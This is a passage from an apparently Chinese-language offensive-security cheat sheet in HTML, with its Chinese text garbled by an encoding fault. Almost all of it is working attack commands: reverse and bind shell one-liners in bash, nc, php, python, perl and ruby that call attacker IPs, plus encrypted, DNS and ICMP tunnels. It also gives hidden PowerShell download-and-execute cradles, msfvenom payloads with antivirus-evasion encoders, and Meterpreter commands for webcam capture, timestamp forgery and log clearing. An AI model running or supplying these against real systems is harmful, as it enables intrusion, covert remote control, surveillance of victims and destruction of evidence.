</code></pre>
<p><img src="./img/187.png" alt="image"></p>
<pre><code>&gt;msfvenom -p cmd/unix/reverse_bash LHOST=attackerip LPORT=4444 -o shell.sh
</code></pre>
<p><img src="./img/188.png" alt="image"></p>
<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><pre><code>&gt;nc -e /bin/sh attackerip 4444
&gt;nc -Lp 31337 -vv -e cmd.exe
&amp;
&gt;mknod backpipe p; nc 192.168.0.107 12138 0&lt;backpipe | /bin/bash 1&gt;backpipe
&gt;nc 192.168.0.10 31337
</code></pre>
<h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><pre><code>&gt;mknod backpipe p; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe
</code></pre>
<h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><pre><code>#php -r &#39;$sock=fsockopen(&quot;IP&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.0.107/1234 0&gt;&amp;1&#39;&quot;);?&gt;
</code></pre>
<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><pre><code>&gt;python -c &#39; import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;IP&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]); &#39;
&gt;msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
&gt;import socket,struct,time for x in range(10): try: s=socket.socket(2,socket.SOCK_STREAM) s.connect((&#39;IP&#39;,ç«¯å£)) break except: time.sleep(5) l=struct.unpack(&#39;&gt;I&#39;,s.recv(4))[0] d=s.recv(l) while len(d)
</code></pre>
<h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><pre><code>&gt;perl -e &#39;use Socket;$i=&quot; attackerip &quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;
&gt;perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;
&gt;perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;  #####windows
</code></pre>
<h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><pre><code>&gt;ruby -rsocket -e&#39;f=TCPSocket.open(&quot;attackerip &quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
&gt;ruby -rsocket -e &#39;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;   #####windows
</code></pre>
<h3 id="OpenSSL-encrypt-shell"><a href="#OpenSSL-encrypt-shell" class="headerlink" title="OpenSSL encrypt shell"></a>OpenSSL encrypt shell</h3><pre><code>ç”Ÿæˆè¯ä¹¦
&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
</code></pre>
<p><img src="./img/189.png" alt="image"></p>
<h4 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h4><pre><code>ç›‘å¬
&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port 1337
</code></pre>
<p><img src="./img/190.png" alt="image"></p>
<pre><code>é¶æœºæ‰§è¡Œ
&gt;mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.0.108:1337 &gt; /tmp/s; rm /tmp/s
</code></pre>
<p><img src="./img/191.png" alt="image"></p>
<pre><code>æ­¤æ–¹å¼ä½¿ç”¨TLS1.2 åè®®å¯¹é€šä¿¡è¿›è¡ŒåŠ å¯†
</code></pre>
<h4 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h4><pre><code>æ”»å‡»æœºéœ€ç›‘å¬2ä¸ªç«¯å£ï¼Œä¸€ä¸ªç«¯å£å‘é€å‘½ä»¤ï¼Œä¸€ä¸ªç«¯å£æ¥æ”¶å›æ˜¾
å‘é€
&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port 1337
æ¥æ”¶
&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port 1338
é¶æœºæ‰§è¡Œ
&gt;openssl s_client -quiet -connect 192.168.0.108:1337|cmd.exe|openssl s_client -quiet -connect 192.168.0.108:1338
</code></pre>
<p><img src="./img/192.png" alt="image"><br><img src="./img/193.png" alt="image"><br><img src="./img/194.png" alt="image"></p>
<h3 id="Dnscat2"><a href="#Dnscat2" class="headerlink" title="Dnscat2"></a>Dnscat2</h3><pre><code>å®‰è£…dnscat2
&gt;apt-get -y install ruby-dev git make g++
&gt;gem install bundler
&gt;git clone https://github.com/iagox86/dnscat2.git
&gt;cd dnscat2/server
&gt;bundle install
æ‰§è¡Œ
&gt;ruby dnscat2.rb abc.com -e open --no-cache
</code></pre>
<p><img src="./img/195.png" alt="image"></p>
<h4 id="Powercat"><a href="#Powercat" class="headerlink" title="Powercat"></a>Powercat</h4><pre><code>é¶æœºæ‰§è¡Œ
&gt;powercat -c 192.168.0.108 -v -dns abc.com -e cmd.exe
</code></pre>
<p><img src="./img/196.png" alt="image"></p>
<pre><code>dnscat2æ‰§è¡Œ
&gt;session -i 1è¿›å…¥ä¼šè¯
</code></pre>
<p><img src="./img/197.png" alt="image"></p>
<h4 id="Dnscat2-exe"><a href="#Dnscat2-exe" class="headerlink" title="Dnscat2 exe"></a>Dnscat2 exe</h4><pre><code>Linux
https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-x86.tar.bz2 https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-x64.tar.bz2
https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip
æ”»å‡»æœºæ‰§è¡Œ
&gt;ruby dnscat2.rb --dns &quot;domain=zone.com,host=192.168.0.108&quot; --no-cache
é¶æœºæ‰§è¡Œ
&gt;dnscat2-v0.07-client-win32.exe --dns server=192.168.0.108
</code></pre>
<p><img src="./img/198.png" alt="image"></p>
<pre><code>æ”»å‡»æœºæ‰§è¡Œ
&gt;session -i [ID]è¿›å…¥ä¼šè¯
</code></pre>
<p><img src="./img/199.png" alt="image"><br><img src="./img/200.png" alt="image"></p>
<h3 id="DNS-TXT-Command"><a href="#DNS-TXT-Command" class="headerlink" title="DNS TXT Command"></a>DNS TXT Command</h3><pre><code>https://github.com/samratashok/nishang/Utility/Out-DnsTxt.ps1
https://github.com/samratashok/nishang/Backdoors/DNS_TXT_Pwnage.ps1
æ–°å»ºä¸€ä¸ªpshæ–‡ä»¶ï¼Œä½¿ç”¨out-dnstxtè½¬æ¢ï¼Œè¿™é‡Œçš„å‘½ä»¤æ˜¯net user
</code></pre>
<p><img src="./img/201.png" alt="image"><br><img src="./img/202.png" alt="image"></p>
<pre><code>y0stUSgtTi3i5QIA
æ·»åŠ ä¸€æ¡åŸŸåtxtè®°å½•ï¼Œè¿™é‡Œåœ¨æœ¬åœ°è®¾ç½®ï¼Œæ­£å¸¸æ˜¯åœ¨åŸŸåå•†çš„ç½‘ç«™é‡Œé…ç½®
</code></pre>
<p><img src="./img/203.png" alt="image"></p>
<pre><code>è¿˜éœ€åˆ›å»ºä¸¤ä¸ªtxtè®°å½•ï¼Œåˆ†åˆ«æ˜¯æŒ‡å®šå¼€å§‹å’Œç»“æŸçš„å­—ç¬¦ä¸²
</code></pre>
<p><img src="./img/204.png" alt="image"><br><img src="./img/205.png" alt="image"></p>
<pre><code>é¶æœºæ‰§è¡Œ
&gt;Import-Module .\DNS_TXT_Pwnage.ps1
&gt;DNS_TXT_Pwnage -startdomain start.zone.com -cmdstring cmd -commanddomain 1.zone.com -psstring start -psdomain zone.com -Subdomains 1 -StopString stop
</code></pre>
<p><img src="./img/206.png" alt="image"></p>
<h3 id="Powershell-1"><a href="#Powershell-1" class="headerlink" title="Powershell"></a>Powershell</h3><h4 id="MSF-Powershell"><a href="#MSF-Powershell" class="headerlink" title="MSF+Powershell"></a>MSF+Powershell</h4><pre><code>åå¼¹MSF
é¶æœº
PS &gt;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.100/powersploit/CodeExecution/Invoke-Shellcode.ps1&#39;) 
PS &gt;Invoke-Shellcode -payload windows/meterpreter/reverse_http -lhost 192.168.0.100 -lport 6666 -force
æ”»å‡»æœºï¼š
&gt;use exploit/multi/handler
&gt;set payload windows/x64/meterpreter/reverse_ https
&gt;run
æˆ–
&gt;msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.100 LPORT=4444 -f powershell -o /var/www/html/ps
&gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.0.100/powersploit/CodeExecution/Invoke-Shellcode.ps1&quot;)
&gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.0.100/ps&quot;)
&gt;Invoke-Shellcode -Shellcode ($buf)
æˆ–
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f psh-reflection &gt;/var/www/html/a.ps1
&gt;powershell -nop -w hidden -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.101/a.ps1&#39;)&quot;
</code></pre>
<h4 id="Powercat-1"><a href="#Powercat-1" class="headerlink" title="Powercat"></a>Powercat</h4><pre><code>&gt;powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;)
æ­£å‘è¿æ¥
é¶æœº:powercat -l -p 8080 -e cmd.exe â€“v
æ”»å‡»æœº:nc 192.168.0.1 8080 â€“vv
åå‘è¿æ¥ï¼š
æ”»å‡»æœºï¼šnc â€“l â€“p 8080 â€“vv
é¶æœº:powercat â€“c 192.168.0.1 â€“p 8080 â€“v â€“e cmd.exe
è¿œç¨‹æ‰§è¡Œ
&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://192.168.0.107/ps/powercat/powercat.ps1&#39;); powercat -c 192.168.0.107 -p 12345 -v -e cmd.exe&quot;
æ­£å‘è¿æ¥
é¶æœº:powercat -l -p 8080 -e cmd.exe -v
æ”»å‡»æœº:nc 192.168.0.1 8080 -vv
åå‘è¿æ¥ï¼š
æ”»å‡»æœºï¼šnc -l -p 8080 -vv
é¶æœº:powercat -c 192.168.0.1 -p 8080 -v -e cmd.exe
</code></pre>
<p><img src="./img/207.png" alt="image"></p>
<h4 id="Nishang"><a href="#Nishang" class="headerlink" title="Nishang"></a>Nishang</h4><h5 id="Bind-shell"><a href="#Bind-shell" class="headerlink" title="Bind shell"></a>Bind shell</h5><pre><code>é¶æœºï¼š
&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Bind -Port 12138&quot;
æ”»å‡»æœºï¼š
&gt;nc é¶æœºIP 12138
</code></pre>
<h5 id="åå‘shell"><a href="#åå‘shell" class="headerlink" title="åå‘shell"></a>åå‘shell</h5><pre><code>æ”»å‡»æœºï¼š
&gt;nc -vnlp 9999
é¶æœºï¼š
&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress æ”»å‡»æœºIP -port 9999&quot;
</code></pre>
<h5 id="UDPåå‘shell"><a href="#UDPåå‘shell" class="headerlink" title="UDPåå‘shell"></a>UDPåå‘shell</h5><pre><code>æ”»å‡»æœºï¼š
&gt;nc -lvup 12138
é¶æœºï¼š
&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress æ”»å‡»æœºIP -port 12138&quot;
</code></pre>
<h5 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h5><pre><code>æ”»å‡»æœºï¼š
&gt;powershell -nop -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Shells/Invoke-PoshRatHttps.ps1&#39;); Invoke-PoshRatHttps -IPAddress 192.168.0.98 -Port 8080 -SSLPort 443&quot;  IPåœ°å€æ˜¯æœ¬æœºIP
</code></pre>
<p><img src="./img/208.png" alt="image"></p>
<pre><code>é¶æœºï¼š
&gt;powershell -w hidden -nop -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.98:8080/connect&#39;)
</code></pre>
<p><img src="./img/209.png" alt="image"></p>
<h5 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h5><pre><code>æ”»å‡»æœºIP:108
é¶æœºIP:100
https://github.com/inquisb/icmpsh
é¶æœºæ‰§è¡Œ
&gt;powershell -nop -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.108/ps/nishang/Shells/Invoke-PowerShellIcmp.ps1&#39;);Invoke-PowerShellIcmp 192.168.0.108
</code></pre>
<p><img src="./img/210.png" alt="image"></p>
<pre><code>æ”»å‡»æœºæ‰§è¡Œï¼Œå¼€å¯ç›¸åº”ICMP ECHOè¯·æ±‚
&gt;sysctl -w net.ipv4.icmp_echo_ignore_all=1
&gt;./icmpsh_m.py 192.168.0.108 192.168.0.100
</code></pre>
<p><img src="./img/211.png" alt="image"></p>
<h4 id="Base64-2"><a href="#Base64-2" class="headerlink" title="Base64"></a>Base64</h4><pre><code>&gt;Powershell &quot;$string=&quot;net user&quot;;[convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($string))&quot;
</code></pre>
<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><h4 id="å¸¸è§„ä½¿ç”¨"><a href="#å¸¸è§„ä½¿ç”¨" class="headerlink" title="å¸¸è§„ä½¿ç”¨"></a>å¸¸è§„ä½¿ç”¨</h4><pre><code>#systemctl start postgresql.service å¯åŠ¨æ•°æ®åº“æœåŠ¡
#msfdb init åˆå§‹åŒ–æ•°æ®åº“
#msfconsoleè¿›å…¥MSFæ¡†æ¶
#search  ms17-010 æŸ¥æ‰¾æ”»å‡»æ¨¡å—
#use exploit/windows/smb/ms17_010_eternalblue ä½¿ç”¨æ¨¡å— 
#set payload windows/x64/meterpreter/reverse_tcp è®¾ç½®è½½è·
#info æŸ¥çœ‹ä¿¡æ¯
#show optionsæŸ¥çœ‹éœ€è¦è®¾ç½®çš„å‚æ•°
#set RHOST 192.168.125.138è®¾ç½®å‚æ•°
#exploit æ‰§è¡Œæ”»å‡»æ¨¡å—
#back å›é€€
</code></pre>
<h4 id="æŠ€å·§ä½¿ç”¨"><a href="#æŠ€å·§ä½¿ç”¨" class="headerlink" title="æŠ€å·§ä½¿ç”¨"></a>æŠ€å·§ä½¿ç”¨</h4><pre><code>#handler -H 192.168.0.10 -P 3333 -p windows/x64/meterpreter/reverse_tcpå¿«é€Ÿç›‘å¬
#setg è®¾ç½®å…¨å±€å‚æ•°
#set autorunscript migrate â€“f è‡ªåŠ¨è¿ç§»è¿›ç¨‹
#set autorunscript migrate -n explorer.exe
#set AutoRunScript post/windows/manage/migrate
#set prependmigrate true è‡ªåŠ¨æ³¨å…¥è¿›ç¨‹
#set prependmigrateProc svchost.exe
#set exitonsession falseè·å–åˆ°sessionåç»§ç»­ç›‘å¬ï¼Œè·å¾—å¤šä¸ªsession
#set stagerverifysslcert false é˜²æ­¢å‡ºç°sslé”™è¯¯
#set SessionCommunicationTimeout 0 é˜²æ­¢sessionè¶…æ—¶é€€å‡º
#set SessionExpirationTimeout 0 é˜²æ­¢å¼ºåˆ¶å…³é—­session
#exploit -j -z  åå°æŒç»­ç›‘å¬
&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -e x86/shikata_ga_nai -b &quot;x00&quot; -i 5 -a x86 --platform windows PrependMigrate=true PrependMigrateProc=explorer.exe -f exe -o  1.exe æ‰§è¡Œåæ³¨å…¥åˆ°å·²å­˜åœ¨çš„ä¸€ä¸ªè¿›ç¨‹
&gt;set EnableStageEncoding true
&gt;set stageencoder x86/fnstenv_mov ç¼–ç è¿›è¡Œå…æ€
&gt;set stageencodingfallback false
</code></pre>
<h4 id="æ¨¡å—"><a href="#æ¨¡å—" class="headerlink" title="æ¨¡å—"></a>æ¨¡å—</h4><h5 id="Auxiliary"><a href="#Auxiliary" class="headerlink" title="Auxiliary"></a>Auxiliary</h5><pre><code>#show auxiliary æŸ¥çœ‹æ‰€æœ‰æ¨¡å—
</code></pre>
<h5 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h5><pre><code>#show payloads æŸ¥çœ‹æ‰€æœ‰æ”»å‡»è½½è·
Payloadæ˜¯ç›®æ ‡è¢«æ”»å‡»æ—¶æ‰§è¡Œçš„å®é™…åŠŸèƒ½ä»£ç 
ç”Ÿæˆè½½è·
#use exploit/multi/script/web_delivery
&gt;set target 2
&gt;msfvenom --list payloads åˆ—å‡ºæ‰€æœ‰payload
&gt;msfvenom --list encoders åˆ—å‡ºæ‰€æœ‰ç¼–ç å™¨
</code></pre>
<h6 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h6><pre><code>#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f exe -o /root/1.exe
#msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e x86/shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 3 -f exe -o 1.exe
#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f psh-reflection &gt;xxx.ps1
#msfvenom -a x64 --platform windows -p windows/powershell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1
&gt;msfvenom -p windows/shell_hidden_bind_tcp LHOST=192.168.0.1 LPORT=11111  -f exe&gt; /root/1.exe  ç”ŸæˆNCæ­£å‘è¿æ¥
&gt;msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f exe&gt; 1.exe ç”ŸæˆNCåå‘è¿æ¥
</code></pre>
<h6 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h6><pre><code>#msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e -f elf -a x86 --platform linux -o shell
#msfvenom -p cmd/unix/reverse_bash LHOST=192.168.0.1 LPORT=11111 -f raw &gt; shell.sh
</code></pre>
<h6 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h6><pre><code>#msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f macho &gt; shell.macho
</code></pre>
<h6 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h6><pre><code>#msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw &gt; shell.php
#msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f war &gt; shell.war
#msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f aspx -o payload.aspx
#msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.jsp
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f asp &gt; shell.asp
</code></pre>
<h6 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h6><pre><code>#msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f apk -o payload.apk
#msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=12138 -f raw &gt; shell.apk
#msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=12138 R &gt; test.apk
</code></pre>
<h6 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h6><pre><code>#msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.0.1 LPORT=11111 -f c â€“o /root/1.c
#msfvenom -p cmd/unix/reverse_python LHOST=192.168.0.1 LPORT=11111 -o shell.py
#msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw &gt; shell.py
#msfvenom -p cmd/unix/reverse_perl LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.pl
#msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.rb
#msfvenom -p cmd/unix/reverse_lua LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.lua
</code></pre>
<h6 id="msfè®¾ç½®ç›‘å¬"><a href="#msfè®¾ç½®ç›‘å¬" class="headerlink" title="msfè®¾ç½®ç›‘å¬"></a>msfè®¾ç½®ç›‘å¬</h6><pre><code>#use exploit/multi/handler
#set payloadwindows/meterpreter/reverse_http æŒ‡å®šç›¸åº”çš„payload
#set LHOST 192.168.0.1
#set LPORT 11111
#exploit -j åå°ç›‘å¬
æˆ–åœ¨exploitæ¨¡å—ä¸­ç›´æ¥ä½¿ç”¨set payload å‘½ä»¤æŒ‡å®špayload
</code></pre>
<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><h5 id="äº¤äº’"><a href="#äº¤äº’" class="headerlink" title="äº¤äº’"></a>äº¤äº’</h5><pre><code>å½“æ”»å‡»æˆåŠŸåä¼šè¿”å›ä¼šè¯ï¼Œä½¿ç”¨session -lå‘½ä»¤åˆ—å‡ºå½“å‰è·å–åˆ°çš„ä¼šè¯
#session -l
ä½¿ç”¨
#sessions -i id æ¥è¿›å…¥ä¸€ä¸ªä¼šè¯è¿›è¡Œäº¤äº’
#background å°†å½“å‰ä¼šè¯æ”¾ç½®åå°
#sessions -xæ£€æŸ¥å¿ƒè·³
#sessions -u [ID] cmdshellå‡çº§meterpreter shell
</code></pre>
<h5 id="ææƒ-1"><a href="#ææƒ-1" class="headerlink" title="ææƒ"></a>ææƒ</h5><pre><code>ææƒè¯¦è§ææƒæ¨¡å—
</code></pre>
<h5 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h5><pre><code>#shell è¿›å…¥ç›®æ ‡cmdshell
#uictl [enable/disable] [keyboard/mouse/all]  å¼€å¯æˆ–ç¦æ­¢é”®ç›˜/é¼ æ ‡
#uictl disable mouse  ç¦ç”¨é¼ æ ‡
#uictl disable keyboard  ç¦ç”¨é”®ç›˜
#webcam_list   æŸ¥çœ‹æ‘„åƒå¤´
#webcam_snap   é€šè¿‡æ‘„åƒå¤´æ‹ç…§
#webcam_stream  é€šè¿‡æ‘„åƒå¤´å¼€å¯è§†é¢‘
#execute -H -i -f cmd.exe æ‰§è¡Œcmd.exeï¼Œ-Hä¸å¯è§ï¼Œ-iäº¤äº’ 
#execute -H -m -d calc.exe -f wce.exe -a &quot;-o 1.txt&quot; éšè—æ‰§è¡Œ
#psæŸ¥çœ‹å½“å‰æ´»è·ƒè¿›ç¨‹
#migrate pid     è¿ç§»è¿›ç¨‹
#kill pid   #æ€æ­»è¿›ç¨‹
</code></pre>
<h5 id="æ–‡ä»¶æ“ä½œ"><a href="#æ–‡ä»¶æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h5><pre><code>#pwd æŸ¥çœ‹å½“å‰ç›®å½•
#ls åˆ—å‡ºå½“å‰ç›®å½•æ–‡ä»¶
#search -f *pass*        æœç´¢æ–‡ä»¶
#cat c:\\passwd.txt   æŸ¥çœ‹æ–‡ä»¶å†…å®¹
#upload /tmp/pwn.txt C:\\1.txt   ä¸Šä¼ æ–‡ä»¶
#download c:\\passwd.txt /tmp/  ä¸‹è½½æ–‡ä»¶
#edit c:\\1.txt  ç¼–è¾‘æˆ–åˆ›å»ºæ–‡ä»¶
#rm C:\\1.txt åˆ é™¤æ–‡ä»¶
#mkdir folder  åˆ›å»ºæ–‡ä»¶å¤¹
#rmdir folder  åˆ é™¤æ–‡ä»¶å¤¹
#lcd /tmp   #æ”»å‡»è€…ä¸»æœº åˆ‡æ¢ç›®å½•
#timestomp -v C://2.txt   #æŸ¥çœ‹æ—¶é—´æˆ³
#timestomp C://2.txt -f C://1.txt #å°†1.txtçš„æ—¶é—´æˆ³å¤åˆ¶ç»™2.txt
</code></pre>
<h5 id="åæ¸—é€-amp-æƒé™ç»´æŒ"><a href="#åæ¸—é€-amp-æƒé™ç»´æŒ" class="headerlink" title="åæ¸—é€&amp;æƒé™ç»´æŒ"></a>åæ¸—é€&amp;æƒé™ç»´æŒ</h5><pre><code>è·¯ç”±æ·»åŠ ï¼Œsockså»ºç«‹ï¼Œåé—¨å»ºç«‹ç­‰æŸ¥çœ‹
æŸ¥çœ‹åé—¨&amp;æŒä¹…åŒ–æ¿å—
</code></pre>
<h5 id="æ¸…ç†æ—¥å¿—"><a href="#æ¸…ç†æ—¥å¿—" class="headerlink" title="æ¸…ç†æ—¥å¿—"></a>æ¸…ç†æ—¥å¿—</h5><pre><code>#clearev 
</code></pre>
<h4 id="MSFæ´¾ç”ŸCobalt-strikeå’ŒEmpire"><a href="#MSFæ´¾ç”ŸCobalt-strikeå’ŒEmpire" class="headerlink" title="MSFæ´¾ç”ŸCobalt strikeå’ŒEmpire"></a>MSFæ´¾ç”ŸCobalt strikeå’ŒEmpire</h4><h5 id="æ´¾ç”ŸEmpire"><a href="#æ´¾ç”ŸEmpire" class="headerlink" title="æ´¾ç”ŸEmpire"></a>æ´¾ç”ŸEmpire</h5><pre><code>Empireåˆ›å»ºä¸€ä¸ªListener
åˆ›å»ºä¸€ä¸ªstageré€‰æ‹©windows/dll
MSFä½¿ç”¨
&gt;use post/windows/manage/reflective_dll_inject 
æŒ‡å®šsessionï¼Œdllçš„è·¯å¾„ï¼Œè¿›ç¨‹pid
</code></pre>
<h5 id="æ´¾ç”ŸCobalt-Strike"><a href="#æ´¾ç”ŸCobalt-Strike" class="headerlink" title="æ´¾ç”ŸCobalt Strike"></a>æ´¾ç”ŸCobalt Strike</h5><pre><code>cobalt å¼€å¯ä¸€ä¸ªç›‘å¬å™¨windows/beacon_http/reverse_http
msf 
&gt;use exploit/windows/manage/payload_inject
æŒ‡å®šIPã€ç«¯å£ã€payloadå³å¯
</code></pre>
<h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><pre><code>#git clone https://github.com/EmpireProject/Empire.git
#cd Empire/setup
#./install.sh
</code></pre>
<h4 id="ç›‘å¬"><a href="#ç›‘å¬" class="headerlink" title="ç›‘å¬"></a>ç›‘å¬</h4><pre><code>(Empire) &gt; listeners
(Empire: listeners) &gt; uselistener http
(Empire: listeners) &gt; info æŸ¥çœ‹å‚æ•°ä¿¡æ¯
(Empire: listeners/http) &gt; set Name y
(Empire: listeners/http) &gt; set Host http://192.168.0.1
(Empire: listeners/http) &gt; set Port 8080
(Empire: listeners/http) &gt; execute
&gt;backå‘½ä»¤è¿”å›listenersæ¨¡å—
&gt;listæŸ¥çœ‹å·²æ¿€æ´»çš„listener
&gt;kill httpåˆ é™¤ç›‘å¬
</code></pre>
<h4 id="ç”Ÿæˆ"><a href="#ç”Ÿæˆ" class="headerlink" title="ç”Ÿæˆ"></a>ç”Ÿæˆ</h4><pre><code>(Empire: listeners) &gt; usestager windows/launcher_vbs (åŒå‡»tabé”®æŸ¥çœ‹æ‰€æœ‰æ¨¡å—)
(Empire: stager/windows/launcher_vbs) &gt; info
å¿…é¡»è®¾ç½®listenerçš„åå­—ï¼Œå¯è®¾ç½®ç”Ÿæˆä½ç½®
(Empire: stager/windows/launcher_vbs) &gt; set Listener y
(Empire: stager/windows/launcher_vbs) &gt; execute
å¯ç”Ÿæˆvbsï¼Œé¶æœºæ‰§è¡Œå³å¯ä¸Šçº¿ã€‚
ä½¿ç”¨launcherå‘½ä»¤ç›´æ¥ç”Ÿæˆpowershellæˆ–pythonè„šæœ¬
&gt;launcher powershell Listener-Name
ä½¿ç”¨renameå¯¹agentsæ›´å
&gt;rename 6NMCW4ZB target1
ä½¿ç”¨mainå‘½ä»¤æ”¾å›ä¸»èœå•
&gt;list stale åˆ—å‡ºå¤±å»æƒé™çš„æœºå™¨
&gt;remove stale å»é™¤å¤±å»æƒé™çš„æœºå™¨
</code></pre>
